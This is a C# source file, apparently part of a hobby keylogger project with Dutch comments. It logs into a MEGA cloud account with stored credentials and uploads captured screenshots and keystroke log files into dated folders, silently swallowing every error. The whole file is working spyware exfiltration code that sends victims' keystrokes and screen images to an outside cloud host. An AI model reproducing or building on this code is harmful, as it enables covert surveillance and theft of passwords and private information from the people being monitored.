using CG.Web.MegaApiClient;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace keylogger
{
    class Upload
    {
        #region variable
        private static MegaApiClient client = new MegaApiClient();
        private static INode root;
        private static INode keyloggermap;
        private static INode screenshotsmap;
        private static INode Sendscreenshot;
        private static INode Sendkeylog;
        private static INode screenshotsday;
        private static INode keylogmap;
        public static string email = Properties.Settings.Default.cloud_email;
        public static string wachtwoord = Properties.Settings.Default.cloud_wachtwoord;
        #endregion

        //public static Uri downloadUrl = client.GetDownloadLink(Sendscreenshot);
        //Console.WriteLine(downloadUrl);
        //Console.ReadLine();

        private static void login()
        {
            try
            { client.Login(email, wachtwoord);
              var nodes = client.GetNodes();
              root = nodes.Single(n => n.Type == NodeType.Root);
            }
            catch
            {  }
        }

        #region screenshots
        public static void Screenshotsupload()
        {
            login();

            try
            {
                Screenshotsmaps();

                Sendscreenshot = client.UploadFile(Screenshots.pathString + Screenshots.hour + "." + Screenshots.minuten + "." + Screenshots.seconde + ".jpeg", screenshotsday);

                client.Logout();
            }
            catch   {   }

        }

        private static void Screenshotsmaps()
        {
            // hier de dagelijkst map
            var nodes = client.GetNodes();
            // main folder
            try
            {
                keyloggermap = client.GetNodes(root).Single(n => n.Name == "keylogger");
            }
            catch
            {
                keyloggermap = client.CreateFolder("keylogger", root);
            }
            // screenshots folder
            try
            {
                screenshotsmap = client.GetNodes(keyloggermap).Single(n => n.Name == "screenshots");
            }
            catch
            {
                screenshotsmap = client.CreateFolder("screenshots", keyloggermap);
            }
            // dag map 
            try
            {
                screenshotsday = client.GetNodes(screenshotsmap).Single(n => n.Name == Screenshots.datum.ToShortDateString());
            }
            catch
            {
                screenshotsday = client.CreateFolder(Screenshots.datum.ToShortDateString(), screenshotsmap);
            }
        }
        #endregion

        // deze moet aan gepast worden op de text bestand nog
        #region keylogger
        
                public static void Keylogupload()
                {

                    login();

                    try
                    {
                        Keylogsmaps();

                        Sendkeylog = client.UploadFile(Keylogger.path, keylogmap);

                        client.Logout();
                    }
                    catch   {   }



                }

                private static void Keylogsmaps()
                {
                    // hier de dagelijkst map
                    var nodes = client.GetNodes();
                    // main folder
                    try
                    {
                        keyloggermap = client.GetNodes(root).Single(n => n.Name == "keylogger");
                    }
                    catch
                    {
                        keyloggermap = client.CreateFolder("keylogger", root);
                    }
                    // keylogs
                    try
                    {
                        keylogmap = client.GetNodes(keyloggermap).Single(n => n.Name == "keylog");
                    }
                    catch
                    {
                        keylogmap = client.CreateFolder("keylog", keyloggermap);
                    }

                }
          #endregion

    }
}